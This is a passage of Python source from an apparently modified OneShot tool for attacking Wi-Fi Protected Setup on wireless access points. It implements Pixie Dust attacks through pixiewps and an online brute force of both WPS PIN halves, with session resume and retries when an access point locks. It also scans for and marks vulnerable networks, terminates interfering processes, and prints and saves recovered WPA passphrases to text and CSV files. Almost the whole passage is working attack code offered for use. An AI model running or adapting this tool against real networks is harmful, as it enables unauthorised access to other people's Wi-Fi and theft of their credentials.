        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            RealtimeLogger.err(f'Pixiewps error: {e}')
            return False
        print(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    RealtimeLogger.ok(f'Pixiewps recovered PIN: {pin}')
                    return pin
            RealtimeLogger.warn('Pixiewps ran but could not find PIN in output')
        else:
            RealtimeLogger.err('Pixiewps failed')
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        RealtimeLogger.separator()
        RealtimeLogger.ok(f'WPS PIN  → {wps_pin}')
        RealtimeLogger.ok(f'WPA PSK  → {wpa_psk}')
        RealtimeLogger.ok(f'AP SSID  → {essid}')
        RealtimeLogger.separator()

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        RealtimeLogger.ok(f'Credentials saved to {filename}.txt + .csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        RealtimeLogger.info(f'PIN saved to {filename}')

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            RealtimeLogger.info(f'Generated PINs for {bssid}:')
            print('  {:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '  {:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('  Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('  Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            RealtimeLogger.info(f'The only probable PIN selected: {pin["name"]} = {pin["pin"]}')
            pin = pin['pin']
        else:
            RealtimeLogger.warn('No PIN suggestions available')
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None, retry_on_lock=False):
        if not verbose:
            verbose = self.print_debug

        while True:
            self.pixie_creds.clear()
            self.connection_status.clear()
            self.wpas.stdout.read(300)   # Clean the pipe

            wps_start_time = time.time()

            if pbc_mode:
                if bssid:
                    RealtimeLogger.step(f'Starting WPS push button connection to {bssid}…')
                    cmd = f'WPS_PBC {bssid}'
                else:
                    RealtimeLogger.step('Starting WPS push button connection…')
                    cmd = 'WPS_PBC'
            else:
                RealtimeLogger.step(f'Trying PIN {pin}')
                cmd = f'WPS_REG {bssid} {pin}'

            if bssid:
                self.pixie_creds.bssid = bssid.upper()

            RealtimeLogger.step(f'Sending WPS command to wpa_supplicant…')
            r = self.sendAndReceive(cmd)
            if 'OK' not in r:
                self.connection_status.status = 'WPS_FAIL'
                msg = self._explain_wpas_not_ok_status(cmd, r)
                RealtimeLogger.err(msg)
                return False

            RealtimeLogger.ok(f'WPS command accepted by wpa_supplicant')

            while True:
                if not ifaceUpCheck(self.interface):
                    RealtimeLogger.err(f'Interface {self.interface} is no longer UP. Aborting.')
                    self.connection_status.status = 'WPS_FAIL'
                    break

                res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower() if bssid else '')
                if not res:
                    break
                if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                    break

                if self.connection_status.status == 'WPS_TIMEOUT':
                    elapsed = int(time.time() - wps_start_time)
                    RealtimeLogger.warn(f'WPS timeout after {elapsed}s')
                    try:
                        self.wpas.terminate()
                        self.wpas.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        self.wpas.kill()
                    self.__init_wpa_supplicant()
                    time.sleep(1)
                    r = self.sendAndReceive(cmd)
                    if 'OK' not in r:
                        self.connection_status.status = 'WPS_FAIL'
                        RealtimeLogger.err(self._explain_wpas_not_ok_status(cmd, r))
                        return False
                    self.connection_status.clear()
                    continue

            self.sendOnly('WPS_CANCEL')

            if retry_on_lock and self.connection_status.is_locked:
                timeout_val = getattr(args, 'timeout', 60)
                RealtimeLogger.warn(f'{bssid} is WPS LOCKED. Retrying in {timeout_val}s…')
                time.sleep(timeout_val)
                continue

            return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False, null_pin=False):
        if null_pin:
            pin = '00000000'
        elif not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        RealtimeLogger.info(f'Previously calculated PIN found: {t_pin}')
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                            RealtimeLogger.info(f'Using saved PIN: {pin}')
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
                    RealtimeLogger.info(f'Generated PIN: {pin}')
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode, retry_on_lock=True)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode, retry_on_lock=True)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                RealtimeLogger.err('Not enough data collected for Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                RealtimeLogger.ok(f'First half found: {f_half}')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                RealtimeLogger.warn(f'WPS transaction failed at {f_half}, re-trying')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        RealtimeLogger.err('First half not found after exhausting all PINs')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                RealtimeLogger.ok(f'Second half found: {s_half}')
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                RealtimeLogger.warn(f'WPS transaction failed at {f_half}{s_half}, re-trying')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        RealtimeLogger.err('Second half not found')
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    RealtimeLogger.info(f'Saved bruteforce session found for {bssid}')
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                        RealtimeLogger.info(f'Resuming from mask {mask}')
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        RealtimeLogger.step(f'Starting smart bruteforce from mask {mask}')
        RealtimeLogger.info('Bruteforcing first half (0000-9999)…')

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    RealtimeLogger.info('Bruteforcing second half (000-999)…')
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                RealtimeLogger.info(f'Resuming second half bruteforce from {s_half}')
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            RealtimeLogger.warn('Bruteforce aborted')
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            RealtimeLogger.info(f'Session saved to {filename} (mask: {self.bruteforce.mask})')
            if args.loop:
                raise KeyboardInterrupt

    def __print_with_indicators(self, level, msg):
        line = '[{}] [{}] {}'.format(level, self.lastPwr, msg)
        if level in ('+',):
            RealtimeLogger.ok(msg)
        elif level in ('!', '*'):
            RealtimeLogger.step(msg)
        else:
            RealtimeLogger.info(msg)

    def cleanup(self):
        RealtimeLogger.step('Cleaning up Companion resources…')
        self.retsock.close()
        self.wpas.terminate()
        RealtimeLogger.info('wpa_supplicant terminated')
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)
        RealtimeLogger.ok('Companion cleanup complete')

    def __del__(self):
        #self.cleanup()
        try:
            self.cleanup()
        except (ImportError, AttributeError, TypeError):
            pass


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'ESSID': '',
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS version': '1.0',
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'PSK SAE':
                    sec = 'WPA2/WPA3'
                elif result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = True

        def handle_wpsVersion(line, result, networks):
            wps_ver = networks[-1]['WPS version']
            wps_ver_filtered = result.group(1).replace('* Version2:', '')
            if wps_ver_filtered == '2.0':
                wps_ver = '2.0'
            networks[-1]['WPS version'] = wps_ver

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        RealtimeLogger.cmd(cmd)
        RealtimeLogger.step('Scanning for Wi‑Fi networks (this may take 5‑10 seconds)…')
        proc = RealtimeLogger.run_subprocess(cmd)
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] Version2: (.+)'): handle_wpsVersion,
            re.compile(r' [*] Authentication suites: (.+)'): handle_securityType,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                RealtimeLogger.err(f'iw scan failed: {line}')
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix="…"):
            """
            Truncate strings according to display width (supports Full and half width characters)
            :param s: input string
            :param length: Maximum display width (unit: column)
            :param postfix: Truncate suffixes (such as ellipses)
            """
            # Calculate the original display width
            original_width = wcwidth.wcswidth(s)
            
            # Scenario 1: The original width is exactly the same or smaller
            if original_width <= length:
                # Calculate the number of spaces to be filled (by display width)
                padding_needed = length - original_width
                # Allocate spaces evenly to the right of the string
                return s + ' ' * padding_needed
            
            # Scenario 2: Truncation is required
            postfix_width = wcwidth.wcswidth(postfix)
            max_allowed = length - postfix_width
            
            current_width = 0
            truncated = []
            for c in s:
                char_width = wcwidth.wcswidth(c)
                if current_width + char_width > max_allowed:
                    break
                truncated.append(c)
                current_width += char_width
            
            # Construct basic results
            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix
            
            # Accurately adjust the display width
            result_width = wcwidth.wcswidth(result)
            if result_width > length:
                # Remove pre truncation restrictions and switch to more precise truncation
                # Emergency cutoff (to prevent exceeding the limit)
                # Change to character by character processing to ensure not exceeding the limit
                current_width = 0
                safe_truncated = []
                for c in result:
                    char_width = wcwidth.wcswidth(c)
                    if current_width + char_width > length:
                        break
                    safe_truncated.append(c)
                    current_width += char_width
                safe_result = "".join(safe_truncated)
                # If the truncated string becomes shorter, add ellipsis
                if len(safe_result) < len(result):
                    safe_result += postfix
                    # Recheck the width
                    if wcwidth.wcswidth(safe_result) > length:
                        # If the limit is still exceeded after adding ellipsis, remove the ellipsis
                        safe_result = safe_result[:-1]
                return safe_result
            
            # Fill in exact spaces
            padding_needed = length - result_width
            return result + ' ' * padding_needed

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<5} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
            deviceName = truncateStr(network['Device name'], 27)
    
            # Processing the display width of other fields
            processed_number = truncateStr(number, 4)
            processed_bssid = truncateStr(network['BSSID'], 18)
            processed_security = truncateStr(network['Security type'], 8)
            processed_level = truncateStr(str(network['Level']), 4)
            processed_device = deviceName  # 27 columns of width have been processed
            processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
            
            # Directly concatenate the processed fields, separated by spaces in the middle
            line_parts = [
                processed_number,
                processed_bssid,
                essid,
                processed_security,
                processed_level,
                truncateStr(network['WPS version'], 5),
                processed_device,
                processed_model
            ]
            line = ' '.join(line_parts)
            
            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS version'] == '1.0':
                print(colored(line, color='green'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            RealtimeLogger.err('No WPS networks found.')
            return None
        while 1:
            try:
                networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    selected = networks[int(networkNo)]
                    bssid = selected['BSSID']
                    RealtimeLogger.info(f'Selected target: {bssid}')
                    return (bssid, selected)
                else:
                    raise IndexError
            except Exception:
                print('  Invalid number')


def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    RealtimeLogger.cmd(cmd)
    res = RealtimeLogger.run_subprocess(cmd)
    if res.returncode == 0:
        RealtimeLogger.ok(f'Interface {iface} is {action}')
        return True
    else:
        RealtimeLogger.err(f'Failed to bring {iface} {action} (exit {res.returncode})')
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def ifaceUpCheck(interface):
    """Check if the network interface is still up."""
    try:
        cmd = f'ip link show {interface}'
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, encoding='utf-8', timeout=5)
        if r.returncode != 0:
            return False
        return 'UP' in r.stdout
    except (OSError, subprocess.TimeoutExpired):
        return False


def isAndroid():
    """Check if running on Android."""
    return bool(hasattr(sys, 'getandroidapilevel'))


def clearScreen():
    """Clear the terminal screen."""
    sys.stdout.write('\033[H\033[2J')
    sys.stdout.flush()


# -- Interfering-process detection (from OneShot-Extended) --
import json


def _getInterferingProcesses():
    """Get processes using the generic netlink subsystem."""
    try:
        with open('/proc/net/netlink', 'r', encoding='utf-8') as f:
            next(f)
            tokens = (line.split() for line in f)
            pids = {int(p[2]) for p in tokens if len(p) > 2 and p[1] == '16'}
            pids.discard(os.getpid())
    except IOError:
        return []
    interfering = []
    for pid in pids:
        try:
            fd_entries = os.scandir(f'/proc/{pid}/fd')
            has_socket = any('socket' in os.readlink(e.path) for e in fd_entries)
            if has_socket:
                with open(f'/proc/{pid}/comm', 'r', encoding='utf-8') as fc:
                    pname = fc.read().strip()
                if pname == 'system_server':
                    continue
                interfering.append((pid, pname))
        except OSError:
            continue
    return interfering


def _getProcessCommand(pid):
    try:
        with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
            return f.read().replace('\0', ' ').strip()
    except OSError:
        return ''


def _saveKilledProcesses(processes):
    if not processes:
        return
    try:
        killed_file = os.path.join(os.path.expanduser('~/.OneShot/sessions/'), 'killed_processes.json')
        os.makedirs(os.path.dirname(killed_file), exist_ok=True)
        with open(killed_file, 'w', encoding='utf-8') as f:
            json.dump(processes, f, indent=2)
    except IOError as e:
        RealtimeLogger.err(f'Failed to save killed processes: {e}')


def checkRunningProcesses(interface):
    """Warn about processes using the interface."""
    interfering = _getInterferingProcesses()
    if interfering:
        procs = ', '.join([f'{n} (PID {p})' for p, n in interfering])
        RealtimeLogger.warn(f'Process using {interface}: {procs}')


def killInterfering():
    """Kill interfering processes."""
    interfering = _getInterferingProcesses()
    killed = []
    if interfering:
        for pid, pname in interfering:
            try:
                cmdline = _getProcessCommand(pid)
                os.kill(pid, 15)
                RealtimeLogger.warn(f'Terminated {pname} (PID {pid})')
                killed.append((pid, pname, cmdline))
                time.sleep(1.5)
            except OSError as e:
                RealtimeLogger.err(f'Failed to terminate {pname} (PID {pid}): {e}')
        _saveKilledProcesses(killed)


def restoreProcesses():
    """Restore previously killed processes."""
    killed_file = os.path.join(os.path.expanduser('~/.OneShot/sessions/'), 'killed_processes.json')
    if not os.path.exists(killed_file):
        return
    try:
        with open(killed_file, 'r', encoding='utf-8') as f:
            killed = json.load(f)
    except (IOError, json.JSONDecodeError):
        return
    for pid, pname, cmdline in killed:
        if not cmdline:
            continue
        try:
            subprocess.Popen(cmdline, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            RealtimeLogger.info(f'Restored {pname}')
        except (OSError, subprocess.SubprocessError):
            pass
    try:
        os.remove(killed_file)
    except OSError:
        pass


def addVulnerableAP(network_info, vuln_list_file):
    """Add vulnerable device model to vulnwsc.txt if not already present."""
    if not network_info:
        return
    model = network_info.get('Model', '').strip()
    model_number = network_info.get('Model number', '').strip()
    device_name = network_info.get('Device name', '').strip()
    vuln_entry = None
    if model:
        vuln_entry = f'{model} {model_number}'.strip() if model_number else model
    elif device_name:
        vuln_entry = device_name
    if not vuln_entry:
        return
    try:
        try:
            with open(vuln_list_file, 'r', encoding='utf-8') as f:
                existing = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            existing = []
        if vuln_entry in existing:
            return
        with open(vuln_list_file, 'a', encoding='utf-8') as f:
            f.write(f'{vuln_entry}\n')
            RealtimeLogger.info(f'Added {vuln_entry} to vulnerable list')
    except IOError as e:
        RealtimeLogger.err(f'Failed to save to vulnerable list: {e}')


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
        )
    parser.add_argument(
        '-N', '--null-pin',
        action='store_true',
        help='Use a null pin (00000000)'
        )
    parser.add_argument(
        '-k', '--kill',
        action='store_true',
        help='Automatically kill processes interfering with the wireless interface'
        )
    parser.add_argument(
        '--restore',
        action='store_true',
        help='Restore killed interfering processes on exit (--kill)'
        )
    parser.add_argument(
        '-t', '--timeout',
        type=float,
        default=60,
        help='Set the timeout for retrying after WPS lock (default: %(default)s)'
        )
    parser.add_argument(
        '-c', '--clear',
        action='store_true',
        help='Clear the screen on every wi-fi scan'
        )
    parser.add_argument(
        '-D', '--dont-touch-settings',
        action='store_true',
        help="Don't touch the Android Wi-Fi settings on startup and exit"
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )

    args = parser.parse_args()

    # ── Startup banner ──
    RealtimeLogger.separator()
    RealtimeLogger.info('OPX OneShot starting up')
    if args.verbose:
        RealtimeLogger.info('Verbose mode ON — all wpa_supplicant output will be shown live')

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        RealtimeLogger.step('Activating MediaTek Wi‑Fi interface…')
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")
        RealtimeLogger.ok('/dev/wmtWifi activated')

    RealtimeLogger.step(f'Bringing interface {args.interface} up…')
    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    while True:
        try:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                RealtimeLogger.info('PBC mode — connecting via push button')
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        RealtimeLogger.info('No BSSID specified — scanning for available networks')
                    result = scanner.prompt_network()
                    if result is None:
                        if args.loop:
                            args.bssid = None
                            continue
                        else:
                            break
                    args.bssid, network_info = result

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        RealtimeLogger.info(f'Starting bruteforce attack on {args.bssid}')
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    elif args.pixie_dust:
                        RealtimeLogger.info(f'Starting Pixie Dust attack on {args.bssid}')
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                    args.show_pixie_cmd, args.pixie_force)
                    else:
